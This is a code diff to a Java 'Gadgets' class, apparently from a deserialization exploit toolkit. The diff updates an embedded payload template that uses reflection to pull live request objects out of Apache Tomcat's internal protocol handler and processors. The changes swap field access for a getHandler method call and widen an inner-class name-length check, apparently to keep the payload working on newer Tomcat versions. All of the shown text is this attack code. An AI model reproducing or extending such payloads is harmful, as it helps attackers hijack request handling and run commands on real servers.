@@ -98,12 +98,8 @@ public class Gadgets {
         String template = "try {\n" +
             "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
             "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
-            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
-            "            java.lang.reflect.Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");\n" +
             "            contextField.setAccessible(true);\n" +
             "            serviceField.setAccessible(true);\n" +
-            "            requestField.setAccessible(true);\n" +
-            "            handlerField.setAccessible(true);\n" +
             "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
             "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
             "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
@@ -127,11 +123,11 @@ public class Gadgets {
             "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
             "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
             "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
-            "            java.lang.reflect.Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");\n" +
+            "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);" +
             "            contextField.setAccessible(true);\n" +
             "            serviceField.setAccessible(true);\n" +
             "            requestField.setAccessible(true);\n" +
-            "            handlerField.setAccessible(true);\n" +
+            "            getHandlerMethod.setAccessible(true);\n" +
             "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
             "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
             "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
@@ -143,12 +139,12 @@ public class Gadgets {
             "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
             "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
             "                        for (int j = 0; j < classes.length; j++) {\n" +
-            "                            if (52 == (classes[j].getName().length())) {\n" +
+            "                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {\n" +
             "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
             "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
             "                                globalField.setAccessible(true);\n" +
             "                                processorsField.setAccessible(true);\n" +
-            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(handlerField.get(protocolHandler));\n" +
+            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));\n" +
             "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
             "                                for (int k = 0; k < list.size(); k++) {\n" +
             "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
